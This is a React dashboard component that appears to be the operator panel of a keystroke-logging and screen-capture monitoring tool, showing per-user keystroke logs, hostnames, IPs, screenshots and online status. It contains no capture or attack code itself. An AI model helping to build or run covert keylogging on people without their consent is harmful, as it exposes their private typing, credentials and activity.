"use client";

import React, { useEffect, useState } from "react";

import Header from "@/components/Header";
import Footer from "@/components/Footer";
import Sidebar from "@/components/Sidebar";
import UserInfo from "@/components/UserInfo";
import Notification from "@/components/Notification";
import KeystrokeLogs from "@/components/KeystrokeLogs";
import SectionButtons from "@/components/SectionButtons";
import ScreenshotGallery from "@/components/ScreenshotGallery";

const Dashboard: React.FC = () => {
  const [users, setUsers] = useState<string[]>([]);
  const [activeUsers, setActiveUsers] = useState<string[]>([]);
  const [selectedUser, setSelectedUser] = useState<string | null>(null);
  const [keyLogs, setKeyLogs] = useState<
    {
      timestamp: string;
      text: string;
      username: string;
      hostname: string;
      ip: string;
    }[]
  >([]);
  const [activeSection, setActiveSection] = useState<
    "keystrokes" | "screenshots" | "applications" | "liveview"
  >("keystrokes"); // Initialize as empty string

  const [notifications, setNotifications] = useState<
    { id: number; type: "success" | "error" | "warning"; message: string }[]
  >([]); // Notification state

  useEffect(() => {
    // Fetch users and active users on component mount
    const fetchUsers = async () => {
      try {
        const response = await fetch("http://localhost:8080/get_users");
        if (response.ok) {
          const data = await response.json();
          setUsers(data.users);
        } else {
          console.error("Failed to fetch users");
        }
      } catch (error) {
        console.error("Error fetching users:", error);
      }
    };

    const fetchActiveUsers = async () => {
      try {
        const response = await fetch(
          "http://localhost:8080/get_active_users"
        );
        if (response.ok) {
          const data = await response.json();
          setActiveUsers(data.active_users);
          // Notify user status changes
          const onlineUsers = data.active_users.filter(
            (user: string) => !activeUsers.includes(user)
          );
          const offlineUsers = activeUsers.filter(
            (user) => !data.active_users.includes(user)
          );
          if (onlineUsers.length) {
            setNotifications((prev) => [
              ...prev,
              ...onlineUsers.map((user: any) => ({
                id: Date.now() + Math.random(),
                type: "success" as "success", // Explicitly cast the type
                message: `${user} is now online`,
              })),
            ]);
          }
          if (offlineUsers.length) {
            setNotifications((prev) => [
              ...prev,
              ...offlineUsers.map((user: any) => ({
                id: Date.now() + Math.random(),
                type: "error" as "error", // Explicitly cast the type
                message: `${user} is now offline`,
              })),
            ]);
          }
        } else {
          console.error("Failed to fetch active users");
        }
      } catch (error) {
        console.error("Error fetching active users:", error);
      }
    };

    fetchUsers();
    fetchActiveUsers();
    const interval = setInterval(fetchActiveUsers, 30000); // Refresh every 30 seconds

    return () => clearInterval(interval);
  }, [activeUsers]);

  useEffect(() => {
    if (selectedUser && activeSection) {
      const fetchLogs = async () => {
        try {
          const response = await fetch(
            `http://localhost:8080/get_logs?username=${selectedUser}&type=${activeSection}`
          );
          if (response.ok) {
            const data = await response.json();
            if (activeSection === "keystrokes") {
              setKeyLogs(data.logs);
            }
          } else {
            console.error("Failed to fetch logs");
          }
        } catch (error) {
          console.error("Error fetching logs:", error);
        }
      };

      fetchLogs();
    }
  }, [selectedUser, activeSection]);

  const handleButtonClick = (
    section: "keystrokes" | "screenshots" | "applications" | "liveview"
  ) => {
    setActiveSection(section);
  };

  const handleSelectUser = (username: string) => {
    setSelectedUser(username);
    localStorage.setItem("selectedUser", username); // Store the selected user in local storage
  };

  const handleRemoveNotification = (id: number) => {
    setNotifications((prev) =>
      prev.filter((notification) => notification.id !== id)
    );
  };

  return (
    <div className="flex flex-col min-h-screen bg-gray-100">
      <Header />
      <main className="flex-grow flex">
        <div className="flex flex-1">
          <Sidebar
            users={users}
            selectedUser={selectedUser}
            activeUsers={activeUsers}
            onSelectUser={handleSelectUser}
          />
          <div className="flex-1 p-4">
            <SectionButtons
              activeSection={activeSection}
              handleButtonClick={handleButtonClick}
            />

            <div className="pt-4">
              {selectedUser || activeSection ? (
                <>
                  {selectedUser && (
                    <div className="pt-4">
                      {selectedUser || activeSection ? (
                        <UserInfo
                          selectedUser={selectedUser}
                          keyLogs={keyLogs}
                        />
                      ) : (
                        <div className="p-4 bg-slate-50 rounded-lg shadow-md mb-4">
                          <p className="text-md">
                            No user selected or active section.
                          </p>
                        </div>
                      )}
                    </div>
                  )}

                  {activeSection === "keystrokes" && (
                    <KeystrokeLogs keyLogs={keyLogs} />
                  )}

                  {activeSection === "screenshots" && selectedUser && (
                    <div className="mt-8">
                      <ScreenshotGallery username={selectedUser} />
                    </div>
                  )}

                  {/* Add other sections here */}
                </>
              ) : (
                <p className="text-gray-600">Select a section to view data.</p>
              )}
            </div>
          </div>
        </div>
      </main>
      <Notification
        notifications={notifications}
        onRemove={handleRemoveNotification}
      />
      <Footer />
    </div>
  );
};

export default Dashboard;
